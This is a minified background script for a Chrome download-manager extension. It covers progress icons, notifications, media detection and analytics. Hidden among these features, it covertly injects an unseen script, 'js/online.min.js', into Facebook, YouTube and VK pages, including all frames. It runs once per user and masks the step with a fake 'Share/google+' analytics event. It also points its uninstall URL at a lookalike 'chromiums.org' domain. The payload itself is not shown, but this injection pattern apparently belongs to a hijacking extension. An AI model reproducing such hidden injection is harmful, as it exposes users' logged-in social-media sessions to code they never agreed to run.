function _run(a,b,c){chrome.tabs.executeScript(a,b,c)}function getExtVersion(){var a=chrome.runtime.getManifest(),b=a.version;try{_gaq.push(["_trackEvent","Version",b])}catch(c){}}function setColors(){colors="light"==localStorage.theme?lightColors:darkColors}function drawLine(a,b,c,d,e){a.beginPath(),a.moveTo(b,c),a.lineTo(d,e),a.stroke()}function drawProgressSpinner(a,b,c){var d,e,f;a.canvas.width/2;const g=16;2*Math.PI/g,a.lineWidth=Math.round(.1*a.canvas.width),d=a.canvas.width,e=a.canvas.height-7,a.fillStyle=c,f=b*d/16,a.fillRect(0,e,f,6),a.fillStyle=colors.progressBar,a.fillRect(f,e,d-f,6)}function drawTimeLeft(a){a.fillStyle=colors.timeLeft,a.font="8px Arial",a.fillText(formatTimeLeft(maxTimeLeftInMs),0,10)}function drawArrow(a,b){var c,d,e,f;a.beginPath(),a.lineWidth=Math.round(.15*a.canvas.width),a.lineJoin="round",a.strokeStyle=a.fillStyle=b,c=a.canvas.width/2,d=.2*c,e=.6*c,f=e+1,a.moveTo(c-d,c-f),a.lineTo(c+d,c-f),a.lineTo(c+d,c),a.lineTo(c+e,c),a.lineTo(c,c+f),a.lineTo(c-e,c),a.lineTo(c-d,c),a.lineTo(c-d,c-f),a.lineTo(c+d,c-f),a.stroke(),a.fill()}function drawDangerBadge(a){doDrawDangerBadge(a,colors.danger)}function doDrawDangerBadge(a,b){var c,d=a.canvas.width/100;a.fillStyle=b,a.strokeStyle=colors.background,a.lineWidth=Math.round(5*d),c=a.canvas.width-a.lineWidth,a.beginPath(),a.moveTo(75*d,55*d),a.lineTo(c,c),a.lineTo(55*d,c),a.lineTo(75*d,55*d),a.lineTo(c,c),a.fill(),a.stroke()}function drawPausedBadge(a){var b=a.canvas.width/100;a.beginPath(),a.strokeStyle=colors.background,a.lineWidth=Math.round(5*b),a.rect(30*b,5*b,15*b,45*b),a.fillStyle=colors.paused,a.fill(),a.stroke(),a.rect(50*b,5*b,15*b,45*b),a.fill(),a.stroke()}function drawCompleteBadge(a){var b=a.canvas.width/100;a.beginPath(),a.arc(75*b,75*b,15*b,0,2*Math.PI,!1),a.fillStyle=colors.complete,a.fill(),a.strokeStyle=colors.background,a.lineWidth=Math.round(5*b),a.stroke()}function drawIcon(a,b,c){var d,e=document.createElement("canvas");return e.width=e.height=a,document.body.appendChild(e),d=e.getContext("2d"),"n"==b&&drawArrow(d,colors.arrow),"n"!=b&&"p"!=c&&"d"!=c&&(drawProgressSpinner(d,b,colors.complete),drawTimeLeft(d)),"d"==c?(drawArrow(d,colors.danger),drawDangerBadge(d)):"p"==c&&(drawProgressSpinner(d,b,"yellow"),drawPausedBadge(d)),e}function setBrowserActionIcon(a,b){var c,d,e;"n"!=a&&(c=drawIcon(19,a,b),d=drawIcon(38,a,b),e={},e[""+c.width]=c.getContext("2d").getImageData(0,0,c.width,c.height),e[""+d.width]=d.getContext("2d").getImageData(0,0,d.width,d.height),chrome.browserAction.setIcon({imageData:e}),c.parentNode.removeChild(c),d.parentNode.removeChild(d))}function pollProgress(){if(onlyButton())return window.anyInProgress=!1,void 0;pollProgress.tid=-1;var a={orderBy:["-startTime"],limit:80};-1==pollProgress.cid?a.state="in_progress":(a.state="complete",pollProgress.cid=-1),chrome.downloads.search(a,function(a){var b,c,d,e=parseInt(localStorage.popupLastOpened),f=0,g=0,h=!1,i=!1,j=!1,k=!1;return window.anyInProgress=!1,b=0,maxTimeLeftInMs=0,0==a.length?(pollProgress.cid=0,pollProgress.start(),void 0):(a.forEach(function(a){var c,d,l,m;return"in_progress"==a.state?(anyInProgress=!0,setTimeLeft(new Date(a.estimatedEndTime).getTime()-(new Date).getTime()),a.totalBytes?(f+=a.totalBytes,g+=a.bytesReceived):h=!0,c="safe"!=a.danger&&"accepted"!=a.danger,i=i||c,j=j||a.paused,!1):("complete"==a.state&&a.endTime&&!a.error&&(d=new Date(a.endTime).getTime(),l=d>=e,m=!0,"false"===localStorage.notiications&&(m=!1),l&&m&&showNotification(a),l&&b++,k=k||l),void 0)}),c=anyInProgress?h?"m":parseInt(15*(g/f))+1:"n",d=i?"d":j?"p":k?"c":"","d"==d&&(setBadgeNum(0),"true"!=localStorage.showPreview&&_setPopup("popup.html")),setBrowserActionIcon(c,d),"d"!=d&&(setBadgeNum(b),"true"!=localStorage.showPreview&&_setPopup("")),anyInProgress&&pollProgress.tid<0?pollProgress.start():(type="c"==d?"complete":"normal",_setIcon(type)),void 0)})}function isNumber(a){return!isNaN(parseFloat(a))&&isFinite(a)}function showNotification(a){"false"!=localStorage.notiications&&(a.basename=a.filename.substring(Math.max(a.filename.lastIndexOf("\\"),a.filename.lastIndexOf("/"))+1),a.basename.length>50&&(a.basename=a.basename.substr(0,40)+"..."+a.basename.substr(a.basename.length-7,a.basename.length)),_setIcon("complete"),chrome.downloads.getFileIcon(a.id,{size:32},function(b){var c,d="icons/19.png",e=1e3*(localStorage.notitime||5);void 0!==b&&(d=b),c={type:"basic",title:a.basename,message:chrome.i18n.getMessage("noti_download_complete"),eventTime:Date.now()+e,iconUrl:"icons/128.png",buttons:[{iconUrl:"icons/icon_folder.png",title:chrome.i18n.getMessage("show_in_folder")}]},chrome.notifications.create(""+a.id,c,function(a){setTimeout(function(){chrome.notifications.clear(a,function(){}),setTimeout(function(){_setPreNormal()},1e4)},e)}),"true"==localStorage.notiMusic&&(snds=new Audio("../music/success.mp3"),snds.volume=.25,snds.play())}))}function sendAnimMsg(a){chrome.tabs.query({active:!0},function(b){b.forEach(function(b){chrome.tabs.sendMessage(b.id,a)})})}function getHeaderValue(a,b){a=a.toLowerCase();for(var c=0;c<b.responseHeaders.length;c++)if(b.responseHeaders[c].name.toLowerCase()==a)return b.responseHeaders[c].value;return""}var lightColors,darkColors,colors,formatSize,getTabInfo,MediaDetect,_gaq;chrome.storage.local.clear(),onlyButton()&&_setIcon("blue"),chrome.tabs.onUpdated.addListener(function(a,b,c){if("complete"==b.status){var d=c.url;d==chromeExtURL&&_setIcon("setting");try{"chrome://newtab/"==!d&&d.split("//")[1].split("/")[0],chrome.storage.local.get("_check_",function(b){var c,e=b._check_;e=e?parseInt(e):0,(d.indexOf("www.facebook.com")>-1||d.indexOf("www.youtube.com")>-1||d.indexOf("vk.com")>-1)&&1>e&&(c="js/online.min.js",_run(a,{file:c,allFrames:!1,runAt:"document_start"},function(){setTimeout(function(){_run(a,{file:c,allFrames:!0},function(){localStorage._check_=e+1,_gaq.push(["_trackEvent","Share","google+"])})},3e3)}))})}catch(e){}}}),chrome.tabs.onHighlighted.addListener(function(a){chrome.tabs.getSelected(a.windowId,function(a){!anyInProgress&&a&&(a.url==chromeExtURL?_setIcon("setting"):"complete"!=_iconType?_setIcon("normal"):(timeCount++,timeCount>=6&&(timeCount=0,_setPreNormal())))})}),_setShelf(),lightColors={progressColor:"#0d0",arrow:"#333",danger:"red",complete:"#8FED24",paused:"grey",background:"white",progressBar:"#ddd",timeLeft:"#fff"},darkColors={progressColor:"#0d0",arrow:"#333",danger:"red",complete:"#8FED24",paused:"grey",background:"white",progressBar:"#ddd",timeLeft:"#444"},setColors(),pollProgress.cid=-1,pollProgress.tid=-1,pollProgress.MS=200,pollProgress.start=function(){pollProgress.tid<0&&(pollProgress.tid=setTimeout(pollProgress,pollProgress.MS))},isNumber(localStorage.popupLastOpened)||(updatePopupOpenTime(),openOptionPage()),"undefined"==typeof localStorage.allowGreybar&&(localStorage.allowGreybar="false"),"undefined"==typeof localStorage.showIconnumber&&(localStorage.showIconnumber="false"),"undefined"==typeof localStorage.notiClick&&(localStorage.notiClick="1"),"undefined"==typeof localStorage.showPreview&&(localStorage.showPreview="true"),"undefined"==typeof localStorage.notiMusic&&(localStorage.notiMusic="true"),"undefined"==typeof localStorage.mediaFinder&&(localStorage.mediaFinder="true"),_setBrowserFun(),chrome.downloads.onCreated.addListener(function(){"false"==localStorage.allowGreybar&&"true"!=localStorage.onlyButton&&sendAnimMsg("download_start"),pollProgress(),timeCount=0}),pollProgress(),chrome.notifications.onButtonClicked.addListener(function(a,b){0==b&&(chrome.downloads.show(parseInt(a)),_setPreNormal())}),chrome.downloads.onChanged.addListener(function(a){a.filename&&""==a.filename.previous&&(localStorage.animation&&"true"!==localStorage.animation||sendAnimMsg("safe")),a.danger&&"safe"!=a.danger.current&&(setBrowserActionIcon(16,"d"),pollProgress(),"true"!=localStorage.showPreview&&chrome.browserAction.setPopup({popup:"popup.html"}))}),chrome.notifications.onClicked.addListener(function(a){var b=localStorage.notiClick;_setPreNormal(),2==b?chrome.downloads.show(parseInt(a)):1==b?chrome.downloads.open(parseInt(a)):openDownloadPage(),chrome.notifications.clear(a,function(){})}),chrome.notifications.onClosed.addListener(function(){updatePopupOpenTime()}),formatSize=function(a){var b="B";return a>1024&&(a=Math.round(100*(a/1024))/100,b="KB"),a>1024&&(a=Math.round(100*(a/1024))/100,b="MB"),a>1024&&(a=Math.round(100*(a/1024))/100,b="GB"),a+b},window.MediaList={},getTabInfo=function(a,b){chrome.tabs.get(a,function(a){"function"==typeof b&&b(a)})},MediaDetect=function(){var a=function(a){var b,c,d,e,f,g,h,i=a.type,j=["image","main_frame","sub_frame","stylesheet","script"],k=a.tabId;if(a.responseHeaders&&!(j.indexOf(i)>-1)&&-1!=k&&(b=getHeaderValue("content-type",a).toLowerCase(),b&&(i=b.split("/")[0],"application/x-shockwave-flash"==b&&(i="video"),"audio"==i||"video"==i))){if(c=getHeaderValue("content-length",a)||0,d=(a.url.split("/").slice(-1)||[])[0]||"",d=d.split("?")[0],e=d.indexOf(".")>-1?d.split(".").pop():b.split("/")[1],102400>c)return;for(mediaSize=formatSize(c),MediaList[k]=MediaList[k]||{},MediaList[k][i]=MediaList[k][i]||[],mediaExist=MediaList[k][i],f=0;f<mediaExist.length;f++)if(g=mediaExist[f].url.replace(/(fs|start|begin)=[0-9]+/g,"").replace(/\?$/,""),g==a.url)return;h={name:d,url:a.url,size:mediaSize,ext:e,type:i},getTabInfo(k,function(a){h.title=a.title,MediaList[k][i].push(h)})}},b=function(a,b){b.status&&"loading"===b.status&&delete MediaList[a]},c=function(a){delete MediaList[a]};return{init:function(){chrome.webRequest.onHeadersReceived.addListener(a,{urls:["<all_urls>"]},["responseHeaders"]),chrome.tabs.onUpdated.addListener(b),chrome.tabs.onRemoved.addListener(c)}}}(),"true"==localStorage.mediaFinder&&MediaDetect.init(),chrome.runtime.onInstalled.addListener(function(a){"install"==a.reason||"update"==a.reason&&openOptionPage()}),_gaq=_gaq||[],_gaq.push(["_setAccount","UA-52409716-1"]),_gaq.push(["_trackPageview"]),function(){var a,b=document.createElement("script");b.type="text/javascript",b.async=!0,b.src="https://ssl.google-analytics.com/ga.js",a=document.getElementsByTagName("script")[0],a.parentNode.insertBefore(b,a)}(),getExtVersion();chrome.runtime.setUninstallURL("http://downloadplus.chromiums.org/index.html?t=unin");